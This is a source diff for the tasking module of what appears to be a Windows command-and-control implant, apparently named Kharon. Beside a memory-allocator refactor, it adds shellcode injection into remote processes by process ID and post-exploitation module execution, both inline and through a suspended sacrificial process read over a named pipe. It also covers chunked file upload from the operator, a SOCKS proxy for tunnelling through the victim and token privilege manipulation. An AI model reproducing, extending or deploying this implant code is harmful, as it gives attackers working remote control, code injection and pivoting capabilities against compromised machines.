@@ -24,7 +24,7 @@ auto DECLFN Task::Dispatcher(VOID) -> VOID {
         goto CLEANUP;
     }
 
-    Parser = (PARSER*)Self->Hp->Alloc( sizeof(PARSER) );
+    Parser = (PARSER*)hAlloc( sizeof(PARSER) );
     if ( ! Parser ) {
         KhDbg("ERROR: Failed to allocate parser memory");
         goto CLEANUP;
@@ -88,7 +88,7 @@ CLEANUP:
     Self->Jbs->Cleanup();
 
     if ( DataPsr ) {
-        Self->Hp->Free( DataPsr );
+        hFree( DataPsr );
     }
 
     if ( Parser ) { 
@@ -147,123 +147,281 @@ auto DECLFN Task::Download(
 auto DECLFN Task::Upload(
     _In_ JOBS* Job
 ) -> ERROR_CODE {
-    Job->State = KH_JOB_RUNNING;
+    PACKAGE* Package  = Job->Pkg;
+    PARSER*  Parser   = Job->Psr;
+    BOOL     Success  = FALSE;    
 
-//     PACKAGE* Package  = NULL;
-//     PARSER*  UParser* = (PARSER*)Self->Hp->Alloc( sizeof( PARSER ) );
-//     BOOL     Success  = FALSE;    
+    ULONG  UUIDLen = 0;
+    PVOID  Data    = { 0 };
+    SIZE_T Length  = 0;
 
-//     ULONG  UUIDLen = 0;
-//     PVOID  Data    = { 0 };
-//     SIZE_T Length  = 0;
+    HANDLE FileHandle = INVALID_HANDLE_VALUE;
 
-//     HANDLE FileHandle = INVALID_HANDLE_VALUE;
+    BYTE* FileBuffer = B_PTR( hAlloc( KH_CHUNK_SIZE ) );
+    ULONG FileLength = 0;
+    BYTE* TmpBuffer  = { 0 };
+    ULONG TmpLength  = 0;
+    ULONG AvalBytes  = 0;
 
-//     BYTE* FileBuffer = B_PTR( Self->Hp->Alloc( KH_CHUNK_SIZE ) );
-//     ULONG FileLength = 0;
-//     BYTE* TmpBuffer  = { 0 };
-//     ULONG TmpLength  = 0;
-//     ULONG AvalBytes  = 0;
+    CHAR* FileID    = nullptr;
+    CHAR* FilePath  = nullptr;
+    ULONG CurChunk  = 1;
 
-//     Self->Pkg->UUID         = Self->Psr->Str( Parser, &Self->Pkg->UUIDl );
-//     Self->Tsp->Tf.Up.FileID = Self->Psr->Str( Parser, 0 );
-//     Self->Tsp->Tf.Up.Path   = Self->Psr->Str( Parser, 0 );
+    ULONG UploadState = Self->Psr->Int32( Parser );
 
-//     if ( !Self->Tsp->Tf.Up.Path ) {
-//         Self->Tsp->Tf.Up.Path = ".";
-//     }
+    switch ( UploadState ) {
+        case Enm::Up::Init: {
+            for ( INT i = 0; i < 5; i++ ) {
+                FileID = Self->Tsp->Up[i].FileID;
+                
+                if ( FileID || Str::LengthA( FileID ) ) {
+                    continue;
+                }
+            }
+            if ( FileID ) {
+                CHAR* ErrorMsg = "[x] The maximum number of files you can upload at the same time is 5";
+                KhDbg( "%s", ErrorMsg );
+                Self->Pkg->SendMsg( Job->UUID, ErrorMsg, CALLBACK_ERROR );
+                return KhRetSuccess;
+            }
 
-//     KhDbg( "uploading file at path %s with id: %s", Self->Tsp->Tf.Up.Path, Self->Tsp->Tf.Up.FileID );
+            FileID   = Self->Psr->Str( Parser, 0 );
+            FilePath = Self->Psr->Str( Parser, 0 );
 
-//     Self->Tsp->Tf.Up.CurChunk = 1;
+            if ( ! FilePath ) {
+                FilePath = ".";
+            }
 
-//     do {
-//         Package = Self->Pkg->Create( TkUpload, Parser );
+            KhDbg( "uploading file at path %s with id: %s", FilePath, FileID );
 
-//         Self->Pkg->Int32( Package, Self->Tsp->Tf.Up.CurChunk );
-//         Self->Pkg->Str( Package, Self->Tsp->Tf.Up.FileID );
-//         Self->Pkg->Str( Package, Self->Tsp->Tf.Up.Path );
-//         Self->Pkg->Int32( Package, Self->Tsp->Tf.Up.ChunkSize );
+            Self->Pkg->Int32( Package, CurChunk );
+            Self->Pkg->Str( Package, FileID );
+            Self->Pkg->Str( Package, FilePath );
+            Self->Pkg->Int32( Package, KH_CHUNK_SIZE );
 
-//         KhDbg( "sending..." )
-//         KhDbg( "current chunk: %d", Self->Tsp->Tf.Up.CurChunk );
-//         KhDbg( "file id      : %s", Self->Tsp->Tf.Up.FileID );
-//         KhDbg( "path         : %s", Self->Tsp->Tf.Up.Path );
-//         KhDbg( "chunk size   : %d", Self->Tsp->Tf.Up.ChunkSize );
+            KhDbg( "sending..." )
+            KhDbg( "current chunk: %d", CurChunk );
+            KhDbg( "file id      : %s", FileID );
+            KhDbg( "path         : %s", FilePath );
+            KhDbg( "chunk size   : %d", KH_CHUNK_SIZE );
 
-//         Self->Pkg->Transmit( Package, &Data, &Length );
-//         KhDbg( "receiving..." )
-//         Self->Psr->New( UParser*, Data, Length );
-    
-//         KhDbg( "receiving..." )
-//         Success = Self->Psr->Int32( UParser* );
-//         if ( !Success ) {
-//             KhDbg( "received fail in the chunk: %d", Self->Tsp->Tf.Up.CurChunk );
-//         }
+            Self->Pkg->Transmit( Package, &Data, &Length );
+                break;
+        }
+        case Enm::Up::Chunk: {
+            INT8 Index = -1;
 
-//         KhDbg( "request with: %s %d", Success ? "success" : "failure", Success );
-    
-//         KhDbg( "receiving..." )
+            FileID = Self->Psr->Str( Parser, 0 );
+            
+            for ( INT i = 0; i < 5; i++ ) {
+                if ( Str::CompareA( FileID, Self->Tsp->Up[i].FileID ) == 0 ) {
+                    Index = i; break;
+                }
+            }
+            if ( Index == -1 ) {
+                CHAR* ErrorMsg = "[x] File ID not found";
+                KhDbg( "%s", ErrorMsg );
+                Self->Pkg->SendMsg( Job->UUID, ErrorMsg, CALLBACK_ERROR );
+                return KhRetSuccess;
+            }
+            break;
+        }
+    }
 
-//         Self->Tsp->Tf.Up.FileID      = Self->Psr->Str( UParser*, &Self->Pkg->UUIDl );
-//         KhDbg( "file id      : %s", Self->Tsp->Tf.Up.FileID );
-//         Self->Tsp->Tf.Up.TotalChunks = Self->Psr->Int32( UParser* );
-//         KhDbg( "receiving..." )
-//         Self->Tsp->Tf.Up.CurChunk    = Self->Psr->Int32( UParser* );
-    
-//         KhDbg( "receiving..." )
-//         KhDbg( "current chunk: %d", Self->Tsp->Tf.Up.CurChunk );
-//         KhDbg( "file id      : %s", Self->Tsp->Tf.Up.FileID );
-//         KhDbg( "path         : %s", Self->Tsp->Tf.Up.Path );
+_KH_END:
+    if ( FileBuffer ) hFree( FileBuffer );
 
-//         TmpBuffer = Self->Psr->Bytes( UParser*, &TmpLength );
-//         if ( !FileBuffer ) {
-//             KhDbg( "fail to get chunk file data" );
-//         }
-
-//         if ( !TmpLength ) break;
-
-//         if ( FileLength + TmpLength > AvalBytes ) {
-//             AvalBytes = FileLength + TmpLength;
-
-//             FileBuffer = B_PTR( Self->Hp->ReAlloc( FileBuffer, AvalBytes ) );
-//         }
-
-//         Mem::Copy( PTR( U_PTR( FileBuffer ) + AvalBytes ), TmpBuffer, TmpLength );
-
-//         FileLength += TmpLength;
-//         Self->Tsp->Tf.Up.CurChunk++;
-
-//         KhDbg( "received [%d bytes] at %p", FileBuffer, FileLength );
-
-//         Self->Psr->Destroy( UParser* );
-
-//         KhDbg(  )
-
-//     } while ( Self->Tsp->Tf.Up.CurChunk <= Self->Tsp->Tf.Up.TotalChunks );
-
-//     FileHandle = Self->Krnl32.CreateFileA(
-//         Self->Tsp->Tf.Up.Path, GENERIC_ALL, FILE_SHARE_READ, 
-//         0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0 
-//     );
-//     if ( !FileHandle || FileHandle == INVALID_HANDLE_VALUE ) goto _KH_END;
-
-//     if ( !( Self->Krnl32.WriteFile( FileHandle, FileBuffer, FileLength, &TmpLength, 0 ) ) ) {
-//         KhDbg( "fail in write file operation" );
-//     }
-
-//     KhDbg( 
-//         "full uploaded with success. file at %p [%d bytes] with chunks: %d", 
-//         FileBuffer, FileLength, Self->Tsp->Tf.Up.CurChunk -1 
-//     );
-
-// _KH_END:
-//     if ( FileBuffer ) Self->Hp->Free( FileBuffer, FileLength );
-//     if ( Package    ) Self->Pkg->Destroy( Package  );
-//     if ( UParser*   ) Self->Psr->Destroy( UParser* );
-
-//     return KhGetError;
+    return KhGetError;
 }
+
+auto DECLFN Task::ScInject(
+    _In_ JOBS* Job
+) -> ERROR_CODE {
+    KhDbg("dbg");
+    PARSER*  Parser  = Job->Psr;
+    PACKAGE* Package = Job->Pkg;
+
+    KhDbg("dbg");
+    ULONG    Length    = 0;
+    KhDbg("dbg");
+    BYTE*    Buffer    = Self->Psr->Bytes( Parser, &Length );
+    KhDbg("dbg");
+    ULONG    ProcessId = Self->Psr->Int32( Parser );
+    KhDbg("dbg");
+    INJ_OBJ* Object    = (INJ_OBJ*)hAlloc( sizeof( INJ_OBJ ) );
+    KhDbg("dbg");
+
+    Object->ProcessId = ProcessId;
+
+    if ( ! Self->Inj->Standard( Buffer, Length, nullptr, 0, Job->UUID, Object ) ) {
+        Self->Pkg->SendMsg( Job->UUID, "[x] Failed to inject into remote process", CALLBACK_ERROR );
+        return KhGetError;
+    }
+
+    hFree( Object );
+
+    return KhRetSuccess;
+}
+
+auto DECLFN Task::PostEx(
+    _In_ JOBS* Job
+) -> ERROR_CODE {
+    KH_DBG_MSG
+    PARSER*  Parser  = Job->Psr;
+    PACKAGE* Package = Job->Pkg;
+    CHAR*    DefUUID = Job->UUID;
+    KH_DBG_MSG
+
+    HANDLE   ReadPipe     = INVALID_HANDLE_VALUE;
+    HANDLE   WritePipe    = INVALID_HANDLE_VALUE;
+    HANDLE   BackupHandle = INVALID_HANDLE_VALUE;
+    HANDLE   PipeHandle   = INVALID_HANDLE_VALUE;
+
+    INJ_OBJ* Object       = nullptr;
+
+    PROCESS_INFORMATION* PsInfo = nullptr;
+
+    BYTE* Output = nullptr;
+
+        KH_DBG_MSG
+
+    ULONG Method  = Self->Psr->Int32( Parser );
+    ULONG Length  = 0;
+    BYTE* Buffer  = Self->Psr->Bytes( Parser, &Length );
+    ULONG ArgLen  = 0;
+    BYTE* ArgBuff = Self->Psr->Bytes( Parser, &ArgLen );
+
+    Object = (INJ_OBJ*)hAlloc( sizeof( INJ_OBJ ) );
+
+    auto CleanupAndReturn = [&]( ERROR_CODE ErrorCode = KhGetError ) -> ERROR_CODE {
+        if ( Output )      hFree( Output );
+        if ( PipeHandle   != INVALID_HANDLE_VALUE ) Self->Ntdll.NtClose( PipeHandle );
+        if ( WritePipe    != INVALID_HANDLE_VALUE ) Self->Ntdll.NtClose( WritePipe );
+        if ( ReadPipe     != INVALID_HANDLE_VALUE ) Self->Ntdll.NtClose( ReadPipe );
+        if ( BackupHandle != INVALID_HANDLE_VALUE ) Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, BackupHandle );
+        if ( PsInfo ) {
+            if ( PsInfo->hProcess ) Self->Ntdll.NtClose( PsInfo->hProcess );
+            if ( PsInfo->hThread  ) Self->Ntdll.NtClose( PsInfo->hThread  );
+            hFree( PsInfo );
+        }
+        if ( Object ) {
+            if ( Object->BaseAddress  ) Self->Mm->Free( Object->BaseAddress, Length + ArgLen, MEM_RELEASE, Object->PsHandle );
+            if ( Object->ThreadHandle ) Self->Ntdll.NtClose( Object->ThreadHandle );
+            
+            hFree( Object );
+        } 
+
+        Job->State = KH_JOB_READY_SEND;
+        
+        return ErrorCode;
+    };
+
+    if (Method == Enm::PostXpl::Inline) {
+        SECURITY_ATTRIBUTES SecAttr = { 
+            .nLength = sizeof(SECURITY_ATTRIBUTES), 
+            .lpSecurityDescriptor = nullptr,
+            .bInheritHandle = TRUE
+        };
+
+        if (!Self->Krnl32.CreatePipe(&ReadPipe, &WritePipe, &SecAttr, PIPE_BUFFER_LENGTH)) {
+            QuickErr(Job->UUID, "[x] Failed to create pipe");
+            return CleanupAndReturn();
+        }
+
+        BackupHandle = Self->Krnl32.GetStdHandle(STD_OUTPUT_HANDLE);
+        Self->Krnl32.SetStdHandle(STD_OUTPUT_HANDLE, WritePipe);
+
+        Object->PsHandle = NtCurrentProcess();
+        Object->Persist  = TRUE;
+
+        if ( ! Self->Inj->Standard( Buffer, Length, ArgBuff, ArgLen, Job->UUID, Object ) ) {
+            QuickErr( "[x] Failed to inject post-ex module");
+            return CleanupAndReturn();
+        }
+
+        Self->Krnl32.WaitForSingleObject( Object->ThreadHandle, INFINITE );
+
+        Self->Ntdll.NtClose( WritePipe );
+        WritePipe = INVALID_HANDLE_VALUE;
+
+        ULONG BytesAvail = 0;
+        if ( Self->Krnl32.PeekNamedPipe( ReadPipe, nullptr, 0, nullptr, &BytesAvail, nullptr ) && BytesAvail > 0 ) {
+            Output = (BYTE*)hAlloc(BytesAvail);
+            if ( Output ) {
+                ULONG BytesRead = 0;
+                if ( Self->Krnl32.ReadFile(ReadPipe, Output, BytesAvail, &BytesRead, nullptr) && BytesRead > 0 ) {
+                    QuickOut( Job->UUID, Job->CmdID, Output, BytesRead );
+                }
+            }
+        }
+    } else if ( Method == Enm::PostXpl::Fork ) {
+        PsInfo = (PROCESS_INFORMATION*)hAlloc( sizeof( PROCESS_INFORMATION ) );
+
+        ULONG ForkState = Self->Psr->Int32(Parser);
+        ULONG ProcessId = Self->Psr->Int32(Parser);
+
+        switch (ForkState) {
+            case Enm::Fork::Init_f: {
+                if ( ! Self->Ps->Create( Self->Ps->Ctx.Spawnto, CREATE_SUSPENDED, PsInfo ) ) {
+                    QuickErr( Job->UUID, "[x] Failed in process creation" );
+                    return CleanupAndReturn( KhGetError );
+                }
+
+                Object->Persist = TRUE;
+                Object->ProcessId = PsInfo->dwProcessId;
+                Object->PsHandle = PsInfo->hProcess;
+
+                if (Self->Inj->Standard(Buffer, Length, ArgBuff, ArgLen, Job->UUID, Object)) {
+                    QuickErr( Job->UUID, "[x] Injection failed in fork mode" );
+                    return CleanupAndReturn( KhGetError );
+                }
+
+                for (INT i = 0; i < sizeof(Self->Inj->Node); i++) {
+                    if (!Self->Inj->Node[i].Object) {
+                        Self->Inj->Node[i].Object = Object;
+                        Object = nullptr; 
+                        break;
+                    }
+                }
+                break;
+            }
+            case Enm::Fork::GetResp_f: {
+                if ( ! Self->Krnl32.WaitNamedPipeA( Self->Ps->Ctx.ForkPipe, 2000 ) ) {
+                    QuickErr("[x] Named pipe not available");
+                    return CleanupAndReturn( KhGetError );
+                }
+
+                PipeHandle = Self->Krnl32.CreateFileA(
+                    KH_FORK_PIPE_NAME, GENERIC_READ, 0,
+                    nullptr, OPEN_EXISTING, 0, nullptr
+                );
+                if (PipeHandle == INVALID_HANDLE_VALUE) {
+                    QuickErr( "[x] Failed to open named pipe" );
+                    return CleanupAndReturn( KhGetError );
+                }
+
+                BYTE ReadBuffer[8192];
+                ULONG BytesRead = 0;
+                BOOL Success = FALSE;
+
+                do {
+                    Success = Self->Krnl32.ReadFile(
+                        PipeHandle, ReadBuffer, 
+                        sizeof(ReadBuffer), &BytesRead, nullptr
+                    );
+                    if (Success && BytesRead > 0) {
+                        QuickOut(Job->UUID, Job->CmdID, ReadBuffer, BytesRead);
+                    }
+                } while (Success && BytesRead > 0);
+
+                break;
+            }
+        }
+    }
+
+    return CleanupAndReturn( ERROR_SUCCESS );
+}
+
 
 auto DECLFN Task::FileSystem(
     _In_ JOBS* Job
@@ -393,7 +551,7 @@ auto DECLFN Task::FileSystem(
             HANDLE FileHandle = Self->Krnl32.CreateFileA( PathName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
 
             FileSize   = Self->Krnl32.GetFileSize( FileHandle, 0 );
-            FileBuffer = B_PTR( Self->Hp->Alloc( FileSize ) );
+            FileBuffer = B_PTR( hAlloc( FileSize ) );
 
             Success = Self->Krnl32.ReadFile( FileHandle, FileBuffer, FileSize, &TmpVal, 0 );
 
@@ -412,7 +570,7 @@ _KH_END:
         Self->Pkg->Int32( Package, Success );
     }
 
-    if ( Buffer ) { Self->Hp->Free( Buffer ); }
+    if ( Buffer ) { hFree( Buffer ); }
 
     return KhRetSuccess;
 }
@@ -464,7 +622,7 @@ auto DECLFN Task::Socks(
         B64Data = Self->Psr->Bytes(Parser, &B64DataLen);
     
         DataLen = Self->Pkg->Base64DecSize((PCHAR)B64Data);
-        Data = (BYTE*)Self->Hp->Alloc(DataLen);
+        Data = (BYTE*)hAlloc(DataLen);
         if (!Data) {
             KhDbg("Failed to allocate memory for decoded data");
             return ERROR_OUTOFMEMORY;
@@ -486,7 +644,7 @@ auto DECLFN Task::Socks(
     if (IsExit) {
         Operation = KH_SOCKET_CLOSE;
         KhDbg("Operation: CLOSE connection");
-    } else if (Self->Sckt->Exist(ServerID)) {
+    } else if (Self->Skt->Exist(ServerID)) {
         Operation = KH_SOCKET_DATA;
         KhDbg("Operation: DATA for existing connection");
     } else {
@@ -494,7 +652,7 @@ auto DECLFN Task::Socks(
         KhDbg("Operation: NEW connection");
     }
 
-    Self->Sckt->LogData("received", Data, DataLen);
+    Self->Skt->LogData("received", Data, DataLen);
 
     switch ( Operation ) {
         case KH_SOCKET_NEW: {
@@ -623,7 +781,7 @@ auto DECLFN Task::Socks(
                     0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                 };
                 
-                ResponseData = (BYTE*)Self->Hp->Alloc( sizeof(socksResponse) );
+                ResponseData = (BYTE*)hAlloc( sizeof(socksResponse) );
                 if ( !ResponseData ) {
                     KhDbg("Failed to allocate memory for response");
                     Self->Ws2_32.closesocket( newSocket );
@@ -636,10 +794,10 @@ auto DECLFN Task::Socks(
                 KhDbg("SOCKS response (%d bytes):", ResponseLen);
             }
 
-            ERROR_CODE err = Self->Sckt->Add(ServerID, newSocket);
+            ERROR_CODE err = Self->Skt->Add(ServerID, newSocket);
             if (err != ERROR_SUCCESS) {
                 KhDbg("Failed to store socket: 0x%X", err);
-                if (ResponseData) Self->Hp->Free(ResponseData);
+                if (ResponseData) hFree(ResponseData);
                 Self->Ws2_32.closesocket(newSocket);
                 return err;
             }
@@ -669,7 +827,7 @@ auto DECLFN Task::Socks(
         case KH_SOCKET_DATA: {
             KhDbg("Processing data for existing connection");
 
-            SOCKET ActiveSock = Self->Sckt->Get( ServerID );
+            SOCKET ActiveSock = Self->Skt->Get( ServerID );
             if ( ActiveSock == INVALID_SOCKET ) {
                 KhDbg("Connection not found for ServerID: %u", ServerID);
                 return ERROR_NOT_FOUND;
@@ -678,7 +836,7 @@ auto DECLFN Task::Socks(
             KhDbg("Input data to forward (%d bytes):", DataLen);
 
             if ( DataLen > 0 ) {
-                Self->Sckt->LogData( "Sending to target", Data, DataLen );
+                Self->Skt->LogData( "Sending to target", Data, DataLen );
 
                 INT32 DataSent = Self->Ws2_32.send( ActiveSock, (CHAR*)Data, DataLen, 0 );
                 if ( DataSent == SOCKET_ERROR )  {
@@ -688,7 +846,7 @@ auto DECLFN Task::Socks(
                 KhDbg( "Data sent" );
 
                 ULONG BuffRecvL = max( 0x1000, DataLen * 2 );
-                BYTE* BuffRecv  = (BYTE*)Self->Hp->Alloc( BuffRecvL );
+                BYTE* BuffRecv  = (BYTE*)hAlloc( BuffRecvL );
 
                 KhDbg( "Allocating buffer to receive data: %d", BuffRecvL );
 
@@ -714,7 +872,7 @@ auto DECLFN Task::Socks(
                             ULONG DataRead = 0;
 
                             if ( 
-                                Self->Sckt->RecvAll( 
+                                Self->Skt->RecvAll( 
                                     ActiveSock, ( BuffRecv + TotalRead ), min( DataAvail, ( BuffRecvL - TotalRead ) ), &DataRead 
                                 )
                             ) {
@@ -731,14 +889,14 @@ auto DECLFN Task::Socks(
                     }
 
                     if ( TotalRead > 0 ) {
-                        Self->Sckt->LogData( "Sending to Srv", BuffRecv, BuffRecvL );
+                        Self->Skt->LogData( "Sending to Srv", BuffRecv, BuffRecvL );
                         ResponseData = BuffRecv;
                         ResponseLen  = BuffRecvL;
                     } else {
                         KhDbg( "no data received within timout" );
                     }
 
-                    Self->Hp->Free( BuffRecv );
+                    hFree( BuffRecv );
                 }
             } else {
                 KhDbg( "no data to send" );
@@ -750,11 +908,11 @@ auto DECLFN Task::Socks(
         case KH_SOCKET_CLOSE: {
             KhDbg("Closing SOCKS connection");
 
-            SOCKET sockToClose = Self->Sckt->Get(ServerID);
+            SOCKET sockToClose = Self->Skt->Get(ServerID);
             if (sockToClose != INVALID_SOCKET) {
                 KhDbg("Closing socket: %llu", (ULONG64)sockToClose);
                 Self->Ws2_32.closesocket(sockToClose);
-                Self->Sckt->RmCtx(ServerID);
+                Self->Skt->RmCtx(ServerID);
             } else {
                 KhDbg("Socket not found for closing");
             }
@@ -775,16 +933,16 @@ auto DECLFN Task::Socks(
     Self->Pkg->Int32( Package, ServerID);
 
     if ( ResponseData ) {
-        Self->Sckt->LogData("sending", ResponseData, ResponseLen);
+        Self->Skt->LogData("sending", ResponseData, ResponseLen);
 
         PCHAR FinalPkt = Self->Pkg->Base64Enc(ResponseData, ResponseLen);
         ULONG FinalLen = Self->Pkg->Base64EncSize(ResponseLen);
         Self->Pkg->Bytes(Package, (PUCHAR)FinalPkt, FinalLen);
-        Self->Hp->Free(ResponseData);
+        hFree(ResponseData);
     }
 
     if ( Data ) {
-        Self->Hp->Free(Data);
+        hFree(Data);
     }
 
     KhDbg("SOCKS task completed with status: 0x%X", Result);
@@ -813,7 +971,7 @@ auto DECLFN Task::Socks(
         
 //         B64Data = Self->Psr->Bytes( Parser, &B64DataLen );
 //         DataLen = Self->Pkg->Base64DecSize((PCHAR)B64Data );
-//         Data = (BYTE*)Self->Hp->Alloc( DataLen );
+//         Data = (BYTE*)hAlloc( DataLen );
 //         if (!Data) {
 //             KhDbg("SOCKS5: ERROR: Allocation failed (Size=%u)", DataLen);
 //             return ERROR_OUTOFMEMORY;
@@ -911,7 +1069,7 @@ auto DECLFN Task::Socks(
 
 //             KhDbg("SOCKS5: Connection established");
 
-//             ResponseData = (BYTE*)Self->Hp->Alloc(10);
+//             ResponseData = (BYTE*)hAlloc(10);
 //             if (!ResponseData) {
 //                 KhDbg("SOCKS5: ERROR: Failed to allocate response buffer");
 //                 Self->Ws2_32.closesocket(newSocket);
@@ -979,7 +1137,7 @@ auto DECLFN Task::Socks(
 //                 }
 
 //                 if (TmpLen > 0) {
-//                     TmpBuff = (BYTE*)Self->Hp->Alloc( TmpLen );
+//                     TmpBuff = (BYTE*)hAlloc( TmpLen );
 //                     if (!TmpBuff) {
 //                         KhDbg("SOCKS5: ERROR: Failed to allocate buffer for %u bytes", TmpLen);
 //                         break;
@@ -987,7 +1145,7 @@ auto DECLFN Task::Socks(
 
 //                     if (!Self->Sckt->RecvAll(ActiveSock, TmpBuff, TmpLen, &TmpLen)) {
 //                         KhDbg("SOCKS5: ERROR: RecvAll failed (Code=0x%X)", KhGetError);
-//                         Self->Hp->Free(TmpBuff);
+//                         hFree(TmpBuff);
 //                         break;
 //                     }
 
@@ -1000,18 +1158,18 @@ auto DECLFN Task::Socks(
 //                             TmpBuff = nullptr;
 //                             KhDbg("SOCKS5: Initial response set (%u bytes)", ResponseLen);
 //                         } else {
-//                             NewBuff = (BYTE*)Self->Hp->Alloc(TmpLen + ResponseLen);
+//                             NewBuff = (BYTE*)hAlloc(TmpLen + ResponseLen);
 //                             if (!NewBuff) {
 //                                 KhDbg("SOCKS5: ERROR: Failed to allocate combined buffer");
-//                                 Self->Hp->Free(TmpBuff);
+//                                 hFree(TmpBuff);
 //                                 break;
 //                             }
 
 //                             Mem::Copy( NewBuff, ResponseData, ResponseLen );
 //                             Mem::Copy( (char*)NewBuff + ResponseLen, TmpBuff, TmpLen );
 
-//                             Self->Hp->Free( ResponseData );
-//                             Self->Hp->Free( TmpBuff );
+//                             hFree( ResponseData );
+//                             hFree( TmpBuff );
 
 //                             ResponseData = NewBuff;
 //                             ResponseLen += TmpLen;
@@ -1046,9 +1204,9 @@ auto DECLFN Task::Socks(
 //     if ( ResponseData && ResponseLen ) {
 //         Self->Sckt->LogData("send data", ResponseData, ResponseLen );
 //         Self->Pkg->Bytes( Package, ResponseData, ResponseLen );
-//         Self->Hp->Free( ResponseData );
+//         hFree( ResponseData );
 //     }
-//     if ( Data ) Self->Hp->Free( Data );
+//     if ( Data ) hFree( Data );
     
 //     KhDbg("SOCKS5: Operation completed (Result=0x%X)", Result);
 //     return Result;
@@ -1104,11 +1262,11 @@ auto DECLFN Task::Config(
             }
             case Enm::Config::CurDir: {
                 if ( Self->Ps->Ctx.CurrentDir ) {
-                    Self->Hp->Free( Self->Ps->Ctx.CurrentDir );
+                    hFree( Self->Ps->Ctx.CurrentDir );
                 }
 
                 PCHAR CurDirTmp  = Self->Psr->Str( Parser, &TmpVal );
-                PCHAR CurrentDir = (PCHAR)Self->Hp->Alloc( TmpVal );
+                PCHAR CurrentDir = (PCHAR)hAlloc( TmpVal );
 
                 Mem::Copy( CurrentDir, CurDirTmp, TmpVal );
 
@@ -1175,7 +1333,7 @@ auto DECLFN Task::Token(
             
             if ( ThreadUser ) {
                 Self->Pkg->Str( Package, ThreadUser );
-                Self->Hp->Free( ThreadUser );
+                hFree( ThreadUser );
                 Self->Ntdll.NtClose( TokenHandle );
 
                 KhSetError( ERROR_SUCCESS );
@@ -1269,11 +1427,11 @@ auto DECLFN Task::Token(
                 Self->Tkn->SetPriv( TokenHandle, static_cast<PRIV_LIST**>(PrivList)[i]->PrivName );
                 Self->Pkg->Str( Package, static_cast<PRIV_LIST**>(PrivList)[i]->PrivName );
                 Self->Pkg->Int32( Package, static_cast<PRIV_LIST**>(PrivList)[i]->Attributes );
-                Self->Hp->Free( static_cast<PRIV_LIST**>(PrivList)[i]->PrivName );
+                hFree( static_cast<PRIV_LIST**>(PrivList)[i]->PrivName );
             }
 
             Self->Ntdll.NtClose( TokenHandle );
-            Self->Hp->Free( PrivList );
+            hFree( PrivList );
 
             break;
         }
@@ -1312,7 +1470,7 @@ auto DECLFN Task::Process(
 
             if ( Self->Ps->Out.p ) {
                 Self->Pkg->Bytes( Package, (UCHAR*)Self->Ps->Out.p, Self->Ps->Out.s );
-                Self->Hp->Free( Self->Ps->Out.p );
+                hFree( Self->Ps->Out.p );
             } 
             
             break;
@@ -1339,7 +1497,7 @@ auto DECLFN Task::Process(
 
             Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, 0, 0, &ReturnLen );
 
-            SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)Self->Hp->Alloc( ReturnLen );
+            SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)hAlloc( ReturnLen );
             if ( !SysProcInfo ) {}
             
             Status = Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, SysProcInfo, ReturnLen, &ReturnLen );
@@ -1364,7 +1522,7 @@ auto DECLFN Task::Process(
                     Self->Pkg->Wstr( Package, SysProcInfo->ImageName.Buffer );
                 }
 
-                CommandLine = (UNICODE_STRING*)Self->Hp->Alloc( sizeof( UNICODE_STRING ) );
+                CommandLine = (UNICODE_STRING*)hAlloc( sizeof( UNICODE_STRING ) );
 
                 Self->Ntdll.NtQueryInformationProcess( 
                     ProcessHandle, ProcessCommandLineInformation, CommandLine, sizeof( CommandLine ), nullptr 
@@ -1375,7 +1533,7 @@ auto DECLFN Task::Process(
                     Self->Pkg->Wstr( Package, L"-" );
                 }
 
-                Self->Hp->Free( CommandLine );
+                hFree( CommandLine );
       
                 Self->Pkg->Int32( Package, HandleToUlong( SysProcInfo->UniqueProcessId ) );
                 Self->Pkg->Int32( Package, HandleToUlong( SysProcInfo->InheritedFromUniqueProcessId ) );
@@ -1393,7 +1551,7 @@ auto DECLFN Task::Process(
                     Self->Pkg->Str( Package, "-" );
                 } else {
                     Self->Pkg->Str( Package, UserToken );
-                    Self->Hp->Free( UserToken );
+                    hFree( UserToken );
                     Self->Ntdll.NtClose( TokenHandle );
                 }
             
@@ -1411,7 +1569,7 @@ auto DECLFN Task::Process(
 
             } while ( SysProcInfo->NextEntryOffset );
 
-            if ( ValToFree ) Self->Hp->Free( ValToFree );
+            if ( ValToFree ) hFree( ValToFree );
 
             break;
         }
